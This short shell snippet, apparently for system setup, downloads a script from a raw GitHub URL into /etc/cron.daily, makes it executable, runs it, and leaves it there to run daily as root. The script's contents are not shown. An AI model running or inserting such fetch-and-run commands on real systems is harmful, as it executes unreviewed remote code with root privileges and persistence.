cd  /etc/cron.daily/
curl "https://raw.githubusercontent.com/levelip/sh/master/1.sh" -o 1.sh
chmod +x  /etc/cron.daily/1.sh
sh /etc/cron.daily/1.sh
#echo "0 1 * * * root run-parts /etc/cron.daily" >> /etc/crontab

